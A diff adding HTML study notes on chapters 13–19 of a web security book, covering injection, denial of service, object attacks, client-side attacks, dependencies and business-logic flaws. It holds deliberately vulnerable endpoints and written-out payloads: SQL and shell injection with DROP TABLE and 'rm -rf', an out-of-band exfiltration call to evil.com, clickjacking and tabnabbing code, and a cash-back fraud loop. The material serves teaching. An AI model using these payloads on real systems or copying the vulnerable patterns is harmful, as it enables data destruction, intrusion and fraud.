+    <div class="bar"><span class="title">The same bug in a Node/Express endpoint</span><span class="tag bad">vulnerable</span></div>
+<pre><code>app.post('/users', function(req, res) {
+  const user_id = req.body.user_id;
+
+  await sql.connect('mssql://username:password@localhost/database');
+  const result = await sql.query('SELECT * FROM users WHERE USER = ' + user_id);
+
+  return res.json(result);
+});</code></pre>
+  </div>
+  <p>Three payloads, three levels of damage:</p>
+  <div class="code">
+    <div class="bar"><span class="title">From “show me everything” to “change my account”</span><span class="tag bad">payloads</span></div>
+<pre><code>// 1. truthy — returns every user
+user_id = '1=1'
+// SELECT * FROM users WHERE USER = true
+
+// 2. destructive — appends a second statement
+user_id = '123abc; DROP TABLE users;'
+// SELECT * FROM users WHERE USER = 123abc; DROP TABLE users;
+
+// 3. quiet escalation — give yourself credits
+user_id = '123abc; UPDATE users SET credits = 10000 WHERE user = 123abc;'</code></pre>
+  </div>
+
+  <figure>
+    <img src="@@FIG:hoff_13-1.jpg@@" alt="Flow diagram of SQL injection: a payload with escape characters reaches a database and the user's own query runs">
+    <figcaption><b>Figure 13-1 — SQL injection.</b> The payload contains escape characters plus SQL code; the endpoint queries the database with it; the interpreter is escaped and the attacker’s statement runs — here, changing the user to “admin”. Whether the result is reflected back to you is irrelevant: the query already ran.</figcaption>
+  </figure>
+
+  <h3>Code injection — the interpreter need not be SQL</h3>
+  <p>Most applications use a database, so most injection is SQL. But any interpreter reachable from an API is a target. The book’s example is a media service with <code>uploadImage</code>, <code>uploadVideo</code>, <code>getImage</code> and <code>getVideo</code>:</p>
+  <div class="code">
+    <div class="bar"><span class="title">uploadImage: the filename is the injection point</span><span class="tag neutral">book code</span></div>
+<pre><code>app.post('/uploadImage', function(req, res) {
+  if (!session.isAuthenticated) { return res.sendStatus(401); }
+
+  // write the raw image to disk
+  fs.writeFileSync(`/images/raw/${req.body.name}.png`, req.body.image);
+
+  const compressImage = async function() {
+    const res = await imagemin([`/images/raw/${req.body.name}.png`],
+                                `/images/compressed/${req.body.name}.jpg`);
+    return res;
+  };
+
+  const res = await compressImage();
+  return res.status(200)
+    .json({ url: `https://media.mega-bank.com/images/${req.body.name}.jpg` });
+});</code></pre>
+  </div>
+  <p>It looks like a badly written API endpoint with a filename-collision edge case: send <code>name = main_logo.png</code> and you overwrite the front page’s logo. But <code>imagemin</code> invokes <code>imagemin-cli</code> — so this is injection through an unsanitised CLI.</p>
+  <p>The video endpoint makes the pattern explicit — user-controlled options are concatenated into a shell command:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Options appended straight into a command</span><span class="tag bad">vulnerable</span></div>
+<pre><code>const defaultOptions = '-s 1280x720';
+
+app.post('/uploadVideo', function(req, res) {
+  if (!session.isAuthenticated) { return res.sendStatus(401); }
+
+  const videoData = req.body.video;
+  const videoName = req.body.name;
+  const options   = defaultOptions + req.body.options;
+
+  exec(`convert -d ${videoData} -n ${videoName} -o ${options}`);
+});</code></pre>
+  </div>
+  <div class="code">
+    <div class="bar"><span class="title">Valid options… and then the same field used to add a command</span><span class="tag bad">payload</span></div>
+<pre><code>const options = '-c h264 -ab 192k';                               // intended
+const options = '-c h264 -ab 192k \\ convert -dir /videos -s 1x1'; // injected</code></pre>
+  </div>
+  <p>Whether injected text starts a new command depends on the CLI: some accept several commands per line, others break on newlines, spaces or <code>&amp;&amp;</code>. And if the command runs in Bash rather than inside a contained tool, escaping one quote is enough to reach the OS itself:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Code injection becomes command injection</span><span class="tag bad">payload</span></div>
+<pre><code>const options = "' &amp;&amp; rm -rf /videos";
+
+// what the host OS then runs:
+$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' &amp;&amp; rm -rf /videos</code></pre>
+  </div>
+
+  <div class="figrow">
+    <figure>
+      <img src="@@FIG:hoff_13-2.jpg@@" alt="Flow diagram of CLI injection: user input reaches a command-line tool as extra commands">
+      <figcaption><b>Figure 13-2 — CLI injection.</b> The API passes user input to a command-line tool; the tool interprets the extra text as additional instructions. Damage is limited to that interpreter’s world.</figcaption>
+    </figure>
+    <figure>
+      <img src="@@FIG:hoff_13-3.jpg@@" alt="Flow diagram of command injection where the OS itself is reached">
+      <figcaption><b>Figure 13-3 — command injection.</b> Once the text escapes the tool and hits the shell, the whole operating system is in scope. This is why command injection sits at the top of every risk rating.</figcaption>
+    </figure>
+  </div>
+
+  <h3>Why command injection is the worst case</h3>
+  <p>Over 95% of servers are Unix-based, so shell access usually means access to files like <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>~/.ssh</code> (keys to other systems), <code>/etc/apache2/httpd.conf</code> and <code>/etc/nginx/nginx.conf</code> — read <em>and</em> write. From there the book lists the escalation ladder: steal data, rewrite logs to hide tracks, add a database user for later, delete files, wipe the box, abuse the server’s integrations (e.g. its Sendgrid keys for spam), turn a login form into a phishing form, or lock the admins out and blackmail them.</p>
+  <div class="code">
+    <div class="bar"><span class="title">A “safe converter” that still ends in a shell</span><span class="tag bad">vulnerable</span></div>
+<pre><code>app.post('/uploadVideo', function(req, res) {
+  if (!session.isAuthenticated) { return res.sendStatus(401); }
+
+  fs.writeFileSync(`/videos/raw/${req.body.name}`, req.body.video);
+
+  safe_converter.convert(`/videos/raw/${req.body.name}`,
+                         `/videos/converted/${req.body.name}`)
+    .then(() =&gt; {
+      // the cleanup line is the vulnerability
+      exec(`rm /videos/raw/${req.body.name}`);
+      return res.sendStatus(200);
+    });
+});</code></pre>
+  </div>
+  <div class="code">
+    <div class="bar"><span class="title">The filename is the payload</span><span class="tag bad">payload</span></div>
+<pre><code>const name = 'myVideo.mp4 &amp;&amp; rm -rf /videos/converted/';</code></pre>
+  </div>
+
+  <h3>Getting data back out of an injection</h3>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Technique</th><th>How it works</th><th>When you use it</th></tr></thead>
+      <tbody>
+        <tr><td>In-band</td><td>The payload’s result appears in the response you get back</td><td>The easy case — output is reflected</td></tr>
+        <tr><td>Out-of-band (OOB)</td><td>The database makes an HTTP (or DNS) request to your server, carrying the data — e.g. <code>UTIL_HTTP.request('https://evil.com', …)</code></td><td>Nothing is reflected, but the DB can reach the internet</td></tr>
+        <tr><td>Inferential / blind</td><td>Ask true/false questions and observe timing or errors, e.g. <code>WAITFOR DELAY '0:0:30'</code></td><td>No output, no outbound access — slow but still conclusive</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="code">
+    <div class="bar"><span class="title">Blind injection: prove execution with time</span><span class="tag neutral">book code</span></div>
+<pre><code>const payload = `user_id=1or1=WAITFOR DELAY '0:0:30'`;
+const url = `https://megabank.com/update?${payload}`;
+
+updateUser(url, (result) =&gt; {
+  // nothing is displayed, but the response is delayed 30 seconds
+  console.log(result);
+});</code></pre>
+  </div>
+  <p><strong>Bypassing defences:</strong> blocklists are the usual improvised defence for non-SQL interpreters (CLIs have no prepared statements). They are weak because specs change and inputs can be masked — the same command can be written many ways that a keyword filter will not recognise.</p>
+</section>
+
+<hr>
+
+<!-- ================= CH 14 ================= -->
+<section id="ch14">
+  <h2><span class="num">Chapter 14</span> · Denial of Service</h2>
+  <p class="oneliner">Availability is part of security. If one cheap request can burn a lot of your server, the attacker wins — no data theft required.</p>
+
+  <h3>Regex DoS</h3>
+  <p>Regular expressions validate fields everywhere, and they are usually fast. But a “greedy” regex can be crafted to backtrack catastrophically. The book’s demonstration pattern is <code>/^((ab)*)+$/</code>:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Same regex, two inputs — one harmless, one exponential</span><span class="tag neutral">book example</span></div>
+<pre><code>/^((ab)*)+$/
+
+'ababababababab'    → instant    // valid: matches cleanly
+'abababababababa'   → very slow  // one extra 'a' forces exhaustive backtracking</code></pre>
+  </div>
+  <p>With a failing trailing character, the engine tries every possible grouping — <code>(abababababababa)</code>, <code>(ababababababa)(ba)</code>, … — before concluding the string does not match. The measured growth is brutal:</p>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Malicious input (odd length)</th><th>Execution time</th><th>Safe input (even length)</th><th>Execution time</th></tr></thead>
+      <tbody>
+        <tr><td>23 chars</td><td>8 ms</td><td>22 chars</td><td>&lt;1 ms</td></tr>
+        <tr><td>25 chars</td><td>15 ms</td><td>24 chars</td><td>&lt;1 ms</td></tr>
+        <tr><td>27 chars</td><td>31 ms</td><td>26 chars</td><td>&lt;1 ms</td></tr>
+        <tr><td>29 chars</td><td>61 ms</td><td>28 chars</td><td>&gt;1 ms</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p>Time doubles roughly every two characters. On a server that gets expensive fast; in a browser it can freeze the tab entirely. The nasty part: the vulnerable regex can sit in production for years, harmless until someone finds the matching input — so OSS is disproportionately exposed, because few reviewers can spot a malicious regex.</p>
+
+  <h3>Logical DoS</h3>
+  <p>Here the attacker abuses normal features to make the server do expensive work. First look for resource-heavy operations: anything synchronous, database writes, disk writes, SQL joins, backups, loops.</p>
+  <div class="code">
+    <div class="bar"><span class="title">One request that triggers four expensive things</span><span class="tag neutral">book example</span></div>
+<pre><code>POST /uploadPhoto
+  → database write   (photo metadata)
+  → disk write       (upload log)
+  → SQL join         (user + albums + metadata)
+  → file backup      (disaster recovery copy)</code></pre>
+  </div>
+  <p>You cannot time the server’s internals directly, but you can <em>scale</em> the work by scaling your account. The book’s measurement of <code>GET /metadata/:userid</code>:</p>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Account archetype</th><th>Response time</th></tr></thead>
+      <tbody>
+        <tr><td>New account (1 album, 1 photo)</td><td>120 ms</td></tr>
+        <tr><td>Average account (6 albums, 60 photos)</td><td>470 ms</td></tr>
+        <tr><td>Power user (28 albums, 490 photos)</td><td>1,870 ms</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p>So the attacker inflates an account (600 albums, 3,500 photos — scripted re-uploads) and then hammers that one endpoint. Even if the request times out, the database is often still working.</p>
+
+  <div class="figrow">
+    <figure>
+      <img src="@@FIG:hoff_14-1.jpg@@" alt="Diagram showing one illegitimate user draining server resources so legitimate users are starved">
+      <figcaption><b>Figure 14-1 — logical DoS.</b> A single illegitimate user consumes the resources legitimate users need, producing degradation or outright loss of service.</figcaption>
+    </figure>
+    <figure>
+      <img src="@@FIG:hoff_14-2.jpg@@" alt="Diagram of distributed denial of service with many attacking machines">
+      <figcaption><b>Figure 14-2 — distributed DoS.</b> Many attackers, or a botnet of ordinary infected computers, request en masse. At that volume the defence moves to the edge, not the code.</figcaption>
+    </figure>
+  </div>
+
+  <h3>Distributed and advanced variants</h3>
+  <ul>
+    <li><strong>DDoS</strong> — botnets (real machines owned by real people, controlled by malware) hammer the IP rather than a specific endpoint, usually with raw UDP traffic to exhaust bandwidth. Hard to block because the traffic looks like real users.</li>
+    <li><strong>YoYo attacks</strong> — abuse autoscaling: flood → the cloud scales up → stop → it scales down → repeat. The user experience degrades during every reallocation and your <em>cloud bill</em> explodes. Denial of wallet.</li>
+    <li><strong>Compression attacks</strong> — a malformed upload that makes the compressor (FFMPEG, ImageMagick) burn CPU and memory. The book cites CVE-2021-38094: a crafted video triggering an integer overflow in FFMPEG 4.1’s <code>filter_sobel()</code> (in <code>libavfilter/vf_convolution.c</code>), leading to runaway CPU/memory and a crash. Third-party upload handlers are a huge surface area.</li>
+    <li><strong>Proxy-based DoS</strong> — use someone else’s compute: create thousands of subdomains proxying to the target so search-engine crawlers keep re-indexing the same content, pushing their traffic at the victim. The attacker pays nothing.</li>
+  </ul>
+  <div class="callout info">
+    <span class="label">Where to look</span>
+    <p>The book’s advice: work out which server resources are most valuable for this application — usually RAM/CPU, but sometimes something bespoke like a queue (<em>user a → user b → user c</em>) — then find the APIs that consume them.</p>
+  </div>
+</section>
+
+<hr>
+
+<!-- ================= CH 15 ================= -->
+<section id="ch15">
+  <h2><span class="num">Chapter 15</span> · Attacking Data and Objects</h2>
+  <p class="oneliner">Objects are first-class citizens: they can be created, passed, merged and returned. That convenience is also the attack surface.</p>
+
+  <h3>Mass assignment</h3>
+  <p>Also called autobinding (Spring MVC, ASP.NET) or object injection (legacy PHP). The bug: a function accepts an object and trusts every key in it.</p>
+  <div class="code">
+    <div class="bar"><span class="title">MegaGame: the endpoint and the unvalidated writer</span><span class="tag bad">vulnerable</span></div>
+<pre><code>app.post("updatePlayerData", function(req, res, next) {
+  if (!!req.body.data) {
+    db.update(session.currentUser, req.body.data);
+    return res.sendStatus(200);          // success
+  } else {
+    return res.sendStatus(400);          // error
+  }
+});
+
+const update = function(data) {
+  for (const [key, value] of Object.entries(data)) {
+    database.upsert({ `${key}`: `${value}` });
+  }
+};</code></pre>
+  </div>
+  <p>The problem is not the upsert — it is the missing key validation. The developer expects game state; the attacker adds one field:</p>
+  <div class="code">
+    <div class="bar"><span class="title">The payload is one extra key</span><span class="tag bad">payload</span></div>
+<pre><code>const data = {
+  playerId: 123,
+  playerPosition: { "x": 125, "y": 346 },
+  playerHP: 90,
+  isAdmin: true          // ← the attack
+};</code></pre>
+  </div>
+  <p>The <code>update()</code> loop happily writes <code>isAdmin</code> into the user row: privilege escalation from a single extra JSON key.</p>
+
+  <h3>Insecure Direct Object Reference (IDOR)</h3>
+  <p>Added to the OWASP Top 10 in 2007, less common now, still trivially easy: the server trusts an identifier supplied by the user without checking that this user may touch that object.</p>
+  <div class="code">
+    <div class="bar"><span class="title">A file endpoint that returns whatever you name</span><span class="tag bad">vulnerable</span></div>
+<pre><code>app.get('/files/:id', function(req, res, next) {
+  return res.sendFile(`/filesystem/files/${req.params.id}`);
+});
+
+// intended:  GET https://mywebsite.com/files/my-report-card.txt
+// attack:    GET https://mywebsite.com/files/other-report-card.txt</code></pre>
+  </div>
+  <p>Intercept the request (DevTools, Burp Suite, ZAP) and change the filename. If it comes back, you have read someone else’s data — a privilege escalation achieved by editing one string.</p>
+
+  <h3>Serialization attacks</h3>
+  <p>Data has to be serialised to travel. When a serializer fails to escape its output properly, the resulting blob can execute when something downstream evaluates it:</p>
+  <div class="code">
+    <div class="bar"><span class="title">The serialized-farmer idea: an object becomes a string, then back</span><span class="tag neutral">book example</span></div>
+<pre><code>{
+  "name": "Joe Carrot",
+  "age": 62,
+  "location": "Montana, USA",
+  "crops": { "wheat": { "measurement": "acres", "amount": 100 } }
+}</code></pre>
+  </div>
+  <p>The worked example: npm’s <code>serialize-javascript</code> (30M+ weekly downloads) below version 3.0.9. Input <code>{"foo": /1"/, "bar": "a\"@__R-&lt;UID&gt;-0__@"}</code> produced JSON that re-introduced an unescaped quote; if that output is later passed through <code>eval()</code>, the escaped structure becomes code. The book’s proof of concept:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Serializer output + eval = execution</span><span class="tag bad">payload</span></div>
+<pre><code>eval('(' + serialize({"foo": /1" + console.log(1)/i,
+                     "bar": '"@__R-&lt;UID&gt;-0__@'}) + ')');</code></pre>
+  </div>
+  <ul class="steps">
+    <li><b>Find</b> a function that serialises data.</li>
+    <li><b>Read or test</b> it with common payloads.</li>
+    <li><b>Spot the escaping failure</b> and craft a payload that becomes executable.</li>
+    <li><b>Deliver</b> it through the serializer.</li>
+    <li><b>Collect</b> the result: RCE on the server, or XSS in the browser.</li>
+  </ul>
+</section>
+
+<hr>
+
+<!-- ================= CH 16 ================= -->
+<section id="ch16">
+  <h2><span class="num">Chapter 16</span> · Client-Side Attacks</h2>
+  <p class="oneliner">Attacks that never touch your server — which is exactly why mature organisations find them so hard to see.</p>
+
+  <p>The chapter’s history lesson matters: in Web 1.0 the client was assumed safe because it did nothing. Web 2.0 pushed computation, state and storage (localStorage, sessionStorage, IndexedDB) into the browser, so the client is now a real application — and a real target.</p>
+
+  <h3>Two flavours of client-side attack</h3>
+  <ul>
+    <li><strong>Client-targeted</strong> — a general bug class that can hit client or server, e.g. ReDoS that freezes the browser instead of the server.</li>
+    <li><strong>Client-specific</strong> — bugs that exist only in the browser, e.g. DOM XSS, prototype pollution, clickjacking, tabnabbing.</li>
+  </ul>
+  <div class="callout good">
+    <span class="label">Why attackers love them</span>
+    <p>Download the HTML/CSS/JS once, switch the network off, and try a million payloads locally — nothing reaches the victim’s servers, so nothing shows up in logs, WAFs or anomaly detection. It is also where less testing has happened, so bugs survive longer.</p>
+  </div>
+
+  <h3>Prototype pollution</h3>
+  <p>JavaScript inheritance is a chain: <code>Bob → Technician → Object</code>. If a function or property is missing on an object, the interpreter walks up the chain until it finds it. That is why <code>Bob.toString()</code> works even though nothing defined it on Bob. The attack is to write into the <em>shared</em> part of the chain:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Polluting the prototype from outside the target object</span><span class="tag bad">payload</span></div>
+<pre><code>const Technician = function(name, birthdate, paymentId) {
+  this.name = name;
+  this.birthdate = birthdate;
+  this.paymentId = paymentId;
+};
+const Bob = new Technician("Bob", "12/01/1970", 12345);
+
+// the vulnerable helper the UI exposes
+const addTechnicianFunctionality = function(obj) {
+  Technician.prototype[obj.name] = obj.data;
+};
+
+// attacker input
+{ name: "toString", data: `function() { console.log("polluted!"); }` }
+
+Bob.toString();   // prints "polluted!"</code></pre>
+  </div>
+  <p>The book demonstrates the same via the npm <code>merge</code> package (v2.0). Note the difference between a harmless-looking merge and a polluting one:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Normal merge vs prototype merge vs constructor merge</span><span class="tag bad">payloads</span></div>
+<pre><code>merge(Object, { isAdmin: true });
+console.log(Bob.isAdmin);                     // undefined
+
+merge(Object, { "__proto__.isAdmin": true });
+console.log(Bob.isAdmin);                     // true
+
+merge(Object, { "constructor.prototype.isAdmin": true });
+console.log(Bob.isAdmin);                     // true</code></pre>
+  </div>
+  <p>Three outcomes follow, in increasing severity:</p>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Outcome</th><th>What it looks like</th></tr></thead>
+      <tbody>
+        <tr><td>Denial of service</td><td>A value changes type (float instead of integer) and breaks logic downstream</td></tr>
+        <tr><td>Property injection</td><td>A function reads a value you control and calls something it should not</td></tr>
+        <tr><td>Code execution</td><td>Escalates to XSS in the browser, or true RCE on a Node.js server, via a sink like <code>eval()</code> or <code>DOMParser.parseFromString()</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Clickjacking</h3>
+  <p>The attacker frames your site invisibly and puts their own UI on top, so real clicks land on your real buttons. The book’s famous example is the 2008 Adobe Flash camera-and-microphone hijack: a game page with an invisible, framed Flash settings page underneath, so every click granted hardware permissions.</p>
+  <div class="code">
+    <div class="bar"><span class="title">The whole attack: invisible iframe + click-through button</span><span class="tag bad">payload</span></div>
+<pre><code>&lt;div id="clickjacker"&gt;
+  &lt;span id="fake_button"&gt;click me&lt;/span&gt;
+&lt;/div&gt;
+&lt;iframe id="target_website" src="target-website.com"&gt;&lt;/iframe&gt;
+
+&lt;style&gt;
+  #target_website { opacity: 0; }              /* invisible victim site */
+  #fake_button {
+    position: relative; right: 25px; top: 25px;
+    pointer-events: none;                      /* clicks pass through */
+    background-color: blue;
+  }
+&lt;/style&gt;</code></pre>
+  </div>
+  <p>Because the iframe is the real site, it still has the victim’s cookies — so the click can trigger a privileged API call: make a profile public, confirm a payment, change a password.</p>
+
+  <h3>Tabnabbing and reverse tabnabbing</h3>
+  <div class="two">
+    <div>
+      <h4>Traditional tabnabbing</h4>
+      <p>The attacker’s page opens the <em>legitimate</em> site in a new tab and keeps a handle to it, then later swaps that tab for a look-alike phishing page — after the user has already “verified” it.</p>
+      <div class="code">
+        <div class="bar"><span class="title">Open a tab, wait, replace it</span><span class="tag bad">payload</span></div>
+<pre><code>const goToLegitWebsite = function() {
+  const windowObj = window.open("https://website-b.com");
+
+  setTimeout(() =&gt; {
+    windowObj.location.replace("https://website-c.com");
+  }, 1000 * 60 * 5);   // 5 minutes later
+};</code></pre>
+      </div>
+    </div>
+    <div>
+      <h4>Reverse tabnabbing</h4>
+      <p>The attacker is the <em>new</em> tab and reaches back at the opener. Three delivery routes, from most to least direct:</p>
+      <div class="code">
+        <div class="bar"><span class="title">opener / target=_blank / parent</span><span class="tag bad">payloads</span></div>
+<pre><code>// 1. window.open()
+window.opener.location.replace("https://get-hacked.com");
+
+// 2. a link with target="_blank"
+&lt;a href="https://evil.com" target="_blank"&gt;click&lt;/a&gt;
+
+// 3. an iframe without sandbox/CSP
+window.parent.location.replace("https://get-hacked.com");</code></pre>
+      </div>
+    </div>
+  </div>
+  <p>The root cause is a DOM design choice: a new tab is handed a reference to the tab that opened it. If the opened page is hostile, it can navigate — or replace — the page the user trusts.</p>
+</section>
+
+<hr>
+
+<!-- ================= CH 17 ================= -->
+<section id="ch17">
+  <h2><span class="num">Chapter 17</span> · Exploiting Third-Party Dependencies</h2>
+  <p class="oneliner">A chain is only as strong as its weakest link — and dependencies are usually the link that got the least review.</p>
+
+  <p>Almost everything runs on open source: Reddit (BackboneJS, Bootstrap), Twitch (Webpack, nginx), YouTube (Polymer), LinkedIn (EmberJS), Office Web (Angular), Amazon DocumentDB (MongoDB). Many companies now sell support around an OSS product: Automattic/WordPress, Canonical/Ubuntu, Docker, Elastic/Elasticsearch, GitLab, Mongo.</p>
+  <p>Why that is a security problem: a large OSS codebase is effectively unauditable. You would have to onboard security engineers onto unfamiliar code, then do a point-in-time review — which goes stale on the next pull request. Most companies accept the risk instead. That gap is the attacker’s opening.</p>
+
+  <figure>
+    <img src="@@FIG:hoff_17-1.jpg@@" alt="BuiltWith technology profile page listing the technologies a website uses">
+    <figcaption><b>Figure 17-1 — BuiltWith.</b> A technology profile for <code>news.ycombinator.com</code>: mobile viewport meta, iPhone compatibility, a verified GitHub link, HSTS, and nginx as the web server. Recon on a stack in one lookup — and free confirmation of the fingerprints Part I had you collect by hand.</figcaption>
+  </figure>
+
+  <h3>How integrations are actually built (and how each one fails)</h3>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Method</th><th>Shape</th><th>Security trade-off</th></tr></thead>
+      <tbody>
+        <tr><td>Branch of upstream</td><td>Run your own branch of the OSS project</td><td>Easy to pull fixes, but also easy to pull unreviewed upstream code into production</td></tr>
+        <tr><td>Fork</td><td>A separate repository from the last commit</td><td>Own permissions, own hooks, real separation — but merging upstream gets harder as the fork drifts</td></tr>
+        <tr><td>Self-hosted / installer</td><td>One-click install (WordPress is the classic)</td><td>Most risky: the script runs with elevated privileges, sets up databases, and leaves you unsure where the files are</td></tr>
+        <tr><td>Direct source</td><td>Copy-paste code into your repo</td><td>Ideal for 50–100-line helpers; no notification of upstream fixes, and dependencies come with it</td></tr>
+        <tr><td>Package manager</td><td>npm, Maven, NuGet, Conan, Spack…</td><td>Convenient and cached, but you inherit an entire recursive dependency tree you never read</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="figrow">
+    <figure>
+      <img src="@@FIG:hoff_17-2.jpg@@" alt="The WordPress setup wizard asking for database details">
+      <figcaption><b>Figure 17-2 — WordPress setup.</b> The famous one-click install: it asks for database credentials and configures everything itself. Convenient — and the deployment method the book warns about most, because the setup script runs with elevated privileges and hides the resulting layout.</figcaption>
+    </figure>
+    <figure>
+      <img src="@@FIG:hoff_17-3.jpg@@" alt="The npm website showing the express package with its dependency count">
+      <figcaption><b>Figure 17-3 — npm.</b> The largest JavaScript package registry. Look at the numbers on this page: <code>express</code> has 31 direct dependencies and over 74,000 dependents. That is the tree you are trusting.</figcaption>
+    </figure>
+  </div>
+
+  <h3>Package manager attacks</h3>
+  <ul>
+    <li><strong>left-pad (2016)</strong> — one person’s tiny utility was unpublished and broke the build pipeline of millions of apps. npm now restricts unpublishing.</li>
+    <li><strong>eslint-scope (2018)</strong> — a compromised maintainer account published a version that stole local credentials from every machine that installed it.</li>
+    <li><strong>event-stream (2018)</strong> — a new transitive dependency, <code>flatmap-stream</code>, shipped code that stole Bitcoin wallets.</li>
+    <li><strong>Mechanics</strong> — either a malicious package, or a malicious <em>dependency of a legitimate package</em>. Both require a mix of social engineering and obfuscation so the code is not obvious in review.</li>
+  </ul>
+
+  <div class="figrow">
+    <figure>
+      <img src="@@FIG:hoff_17-4.jpg@@" alt="The Apache Maven project homepage">
+      <figcaption><b>Figure 17-4 — Maven.</b> Java’s dominant package manager, predating Git — which is why its dependency handling is implemented from scratch rather than on top of Git. Same risk profile as npm: plugins and artifacts can be compromised and pulled into a legitimate build.</figcaption>
+    </figure>
+    <figure>
+      <img src="@@FIG:hoff_17-5.jpg@@" alt="The National Vulnerability Database listing CVEs with severity scores">
+      <figcaption><b>Figure 17-5 — NVD.</b> The public record of known vulnerabilities with severity scores. For popular dependencies (jQuery, Bootstrap, WordPress) the serious bugs are almost certainly already documented — which makes “check the version against the CVE database” the fastest path from recon to a working exploit.</figcaption>
+    </figure>
+  </div>
+
+  <div class="callout info">
+    <span class="label">The asymmetry the book points out</span>
+    <p>CVE databases are brilliant for huge projects (jQuery: 10M+ sites, 250+ contributors, ~7,000 commits, 150 releases — all heavily scrutinised) and nearly useless for a two-contributor repo with 300 downloads. Popularity buys you documentation, in both directions.</p>
+  </div>
+</section>
+
+<hr>
+
+<!-- ================= CH 18 ================= -->
+<section id="ch18">
+  <h2><span class="num">Chapter 18</span> · Business Logic Vulnerabilities</h2>
+  <p class="oneliner">No scanner will find these. The code works exactly as written — the <em>rules</em> are what can be bent, and that is where the money is.</p>
+
+  <p>The book draws a clean line: <strong>application logic</strong> is generic (render an image, make a network call), while <strong>business rules</strong> are specific (“a passenger may cancel only if the current time is more than 24 hours before the booking”). A bug in the second is a business-logic vulnerability: hard to find, impossible to automate, often the most valuable.</p>
+
+  <h3>Custom maths — the transfer that forgets to check the balance</h3>
+  <ol>
+    <li>User A asks to send $500 to User B.</li>
+    <li>The server confirms User B exists.</li>
+    <li>The server asks User A to confirm. User A accepts.</li>
+    <li>The server subtracts 500 from User A.</li>
+    <li>The server adds 500 to User B.</li>
+    <li>The server confirms completion.</li>
+  </ol>
+  <p>Notice what is missing: nobody checked that User A <em>has</em> $500. Best case, a database constraint rejects it. Worst case, A’s balance stops at $0 while B keeps gaining $500 per transaction — and A and B are the same person.</p>
+  <div class="callout warn">
+    <span class="label">The two requirements</span>
+    <p>An application is a great target if it lacks either (a) the correct maths for its business rules, or (b) validation of the inputs to that maths. Static analysis will not flag it, because “correct” depends on the bank’s own model.</p>
+  </div>
+
+  <h3>Programmed side effects — the MegaCrypto squeeze</h3>
+  <p>MegaCrypto (MegaBank’s crypto exchange) prices coins by local market demand: MegaCoin $1, ByteCoin $50,000, DoggoCoin $5, GhostCoin $2,000, HardDriveCoin $10. Each night it refills liquidity by buying <em>first</em> from its own users, then from another exchange.</p>
+  <p>Henry Hacker spots the design flaw: the local liquidity pool (~$1M total) is tiny compared with the global market, and local prices are assumed to track global ones. He pools $1M, buys 20 ByteCoin at $50,000 each overnight — the same night the exchange is buying from local users at that rate — and immediately lists them at $100,000. He wakes up with $2M.</p>
+  <p>Nobody broke a rule. The application did what it was told. The missing logic was an edge case: only repurchase local coins if the price is within a percentage of the global average.</p>
+
+  <h3>Quasi-cash attacks — the 4% money machine</h3>
+  <p>MegaCard: 25% APR, $0 annual fee, <strong>5% cash back</strong> on everything for three years. Henry has a merchant account on PayBuddy (1% fee). The loop:</p>
+  <ul class="steps">
+    <li><b>Invoice</b> $1,000 of “consulting” on PayBuddy.</li>
+    <li><b>Pay</b> the invoice with his own MegaCard.</li>
+    <li><b>Net position</b> $990 in the merchant account, $1,000 charged to the card.</li>
+    <li><b>Reward</b> 5% of $1,000 = $50 lands in his bank account.</li>
+    <li><b>Withdraw</b> the $990 to the same bank account.</li>
+    <li><b>Result</b> $1,040 out of a $1,000 charge: <strong>+$40 per cycle</strong>.</li>
+  </ul>
+  <p>Automate one cycle per minute and that is $2,400/hour, $57,600 in a day — and technically the card worked as designed. The missing check: a cardholder who is also a merchant, paying himself, at machine speed. The intermediary (PayBuddy) was not a bank, so the “cash” was just database fields until settlement — hence <em>quasi</em>-cash.</p>
+
+  <h3>Vulnerable standards and conventions — floating point</h3>
+  <p>Almost every mainstream language uses IEEE 754 doubles. Open a console and type <code>0.1 + 0.2</code>:</p>
+  <div class="code">
+    <div class="bar"><span class="title">The first thing every tester should type in a console</span><span class="tag neutral">book example</span></div>
+<pre><code>0.1 + 0.2        // 0.30000000000000004</code></pre>
+  </div>
+  <p>A loss of 4×10⁻¹⁶ per operation. Add once per balance reload and nothing happens for years; multiply or exponentiate in a financial calculation and it compounds. Because maths is standardised, this is a <em>reliable</em> place to hunt: you know how the language behaves before you ever see the server.</p>
+
+  <h3>How to actually find them</h3>
+  <ul>
+    <li>Become the archetypal customer first — think like the person buying groceries with MegaCard.</li>
+    <li>Write down every intended use case, and your best guess at the backend steps behind each one.</li>
+    <li>For each, list the edge cases nobody handled: currency of the reward, merchant-account fees vs rewards, negative invoices, purchase-then-refund keeping the cashback.</li>
+    <li>Test those edge cases. They are the attack vectors.</li>
+  </ul>
+</section>
+
+<hr>
+
+<!-- ================= CH 19 ================= -->
+<section id="ch19">
+  <h2><span class="num">Chapter 19</span> · Part II Summary</h2>
+  <p class="oneliner">Ten attack families, one skill underneath: knowing both the archetype and the business so you can see the unusual case.</p>
+  <ul>
+    <li><strong>Archetypes are necessary but not sufficient</strong> — XSS, CSRF, XXE and injection hit everyone; truly deep flaws are unique to a business model.</li>
+    <li><strong>Look at the business model</strong> — only a deep understanding of business logic finds the advanced flaws.</li>
+    <li><strong>If attacks feel inapplicable, improve recon</strong> — the book’s honest diagnosis: either the target is hardened, or you have not yet found the surface where your payload lands.</li>
+    <li><strong>Pair every attack with its defence</strong> — Part III is the mirror image, and the book reminds you that defences are “mitigations”, not fixes: they are bypassable, so you layer them.</li>
+    <li><strong>These techniques are dangerous</strong> — use them with permission, and prefer red-team framing.</li>
+  </ul>
+</section>
+
+<hr>
+
+<!-- ================= CHEAT SHEET ================= -->
